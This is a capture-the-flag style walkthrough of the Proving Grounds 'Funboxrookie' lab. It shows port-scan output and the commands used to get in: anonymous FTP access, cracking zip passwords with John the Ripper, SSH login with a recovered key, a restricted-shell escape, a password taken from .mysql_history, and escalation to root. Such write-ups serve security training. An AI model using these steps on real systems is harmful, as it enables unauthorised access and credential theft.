* * *
 ### Lab: Funboxrookie
 ### Platform: Proving Grounds
* * *

### Enumeration
- Rustscan's result

       ❯ rustscan -a 192.168.220.107 -- -sC -sV
        .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
        | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
        | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
        `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
        The Modern Day Port Scanner.
        ________________________________________
        : https://discord.gg/GFrQsGy           :
        : https://github.com/RustScan/RustScan :
         --------------------------------------
        😵 https://admin.tryhackme.com
        
        [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
        [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
        [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
        Open 192.168.220.107:22
        Open 192.168.220.107:21
        Open 192.168.220.107:80
        PORT   STATE SERVICE REASON  VERSION
        21/tcp open  ftp     syn-ack ProFTPD 1.3.5e
        | ftp-anon: Anonymous FTP login allowed (FTP code 230)
        | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
        | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
        | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
        | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
        | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
        | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
        | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
        | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
        | -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
        | -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
        | -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
        |_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
        22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)
        | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMD7EHN/CpFOxv4hW16hSiL9/hrqfgN7N5gfqvnRwCeDJ8jj4kzV9XNVm/NN3u+fE7zrclQWDtGRu4oryuQv+25XjPJG7z+OdJ6ncD8k/VyHm3ncPIt1skZNTe8WGR9BGHf2dSvyEgW6Iu2TqICR+Vak48KdMIbmjCo8jbiAx4pNvUjkv7z+vzmr3wJakRhiIa2aA7TFeAVe5o9/Se6IOc/I4ByXcarmeU6hOytDb8qmUSYxSV1nea1jYKinXgCZ7MpAoFB8qPtiy4wryzBgssjAiqAFPEmPjaU96hDAsGMeQ0yFLeCoDTxeY8xnc+oWjU/mm1ISbiJ/IqX2N81xtP
        |   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)
        | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHG2MCQtlbU+bwb4Cuz2xWoPH4/WBRJtUP5pDp8LQM175mj/IP9ORztHIBB+dyfrCshyxnFcIFc35MXp2qhgJFM=
        |   256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)
        |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFhzTG7CoqPllLoboDB4lTrHUfFJLHbEWIRUP1lMA4rT
        80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
        | http-robots.txt: 1 disallowed entry 
        |_/logs/
        |_http-server-header: Apache/2.4.29 (Ubuntu)
        |_http-title: Apache2 Ubuntu Default Page: It works
        | http-methods: 
        |_  Supported Methods: GET POST OPTIONS HEAD

- We can login to ftp using `anonymous:password`,the ftp server contains zip files.I used `get <zipfile> to download one of the files.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/efb825fb-e77c-4769-8477-62ad726667ec)

- The zip file has a password.I cracked it with John the ripper.I got the hash with `zip2john <zip file> > zip.hash`.Then, `john --wordlist=<wordlist> <hashfile>` to crack the file
I used the switch `--show` because I have cracked the hash.

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0a546e03-0f9e-4202-8b40-d446b22d67c5)

- Change the private key permissions with `chmod 600 id_rsa` and login using `ssh -i id_rsa <user>@<ip>`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/53dad1e2-a24c-4e64-9865-291089a3db43)

- It seems we are in a restricted shell,we can escape with `ssh tom@<ip> -i id_rsa -t "bash --noprofile"`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/5676bb0d-37cf-44bc-801b-3aee32dbbad0)

### PRIVESC

- `ls -al` reveals a .mysql_history file which contains tom's password

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/b8a5a45e-83d8-4f72-9e30-ff1a2eafcbb6)

- Binary `su` has a SUID bit,I discovered it with this command `find / -perm -u=s -type f 2</dev/null`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d4e07f98-3afb-44ee-84a1-9ce71f538376)

- Root access with `sudo su` and enter tom's password

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/087a730d-b879-4deb-9bb4-4e84b42b099a)
